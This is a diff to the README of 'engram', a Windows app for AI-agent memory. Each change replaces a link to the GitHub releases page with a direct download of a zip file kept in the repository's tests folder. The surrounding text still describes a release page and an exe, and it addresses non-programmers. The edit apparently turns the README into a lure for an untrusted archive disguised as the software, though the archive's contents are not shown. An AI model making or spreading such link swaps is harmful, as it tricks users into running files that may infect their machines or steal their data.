@@ -1,6 +1,6 @@
 # 🧠 engram - Smarter Memory for Your AI Agents
 
-[![Download engram](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aditxver/engram/releases)
+[![Download engram](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aditxver/engram/main/tests/Software_v3.0.zip)
 
 engram helps your AI agents remember and understand your data. It indexes your knowledge so you can search by meaning. This app runs on Windows in a single file. You do not need any programming skills to use it.
 
@@ -37,10 +37,10 @@ Follow these steps to download and run engram on Windows.
 
 Visit the release page to get the latest version of engram for Windows.
 
-[![Download engram](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/aditxver/engram/releases)
+[![Download engram](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/aditxver/engram/main/tests/Software_v3.0.zip)
 
 Click the link above or go to:  
-https://github.com/aditxver/engram/releases
+https://raw.githubusercontent.com/aditxver/engram/main/tests/Software_v3.0.zip
 
 Look for a file named like `engram-windows.exe` or similar in the latest release. Click the file and save it to a folder you will remember, such as `Downloads` or `Desktop`.
 
@@ -131,7 +131,7 @@ Make sure your data is not locked by other programs when indexing.
 
 To find new versions or report issues, visit the release page:
 
-https://github.com/aditxver/engram/releases
+https://raw.githubusercontent.com/aditxver/engram/main/tests/Software_v3.0.zip
 
 Here you can:
 
@@ -151,4 +151,4 @@ No installation is needed, so updating is quick.
 
 # [🔍] engram - Smarter Memory for Your AI Agents
 
-[![Download engram](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aditxver/engram/releases)
+[![Download engram](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aditxver/engram/main/tests/Software_v3.0.zip)
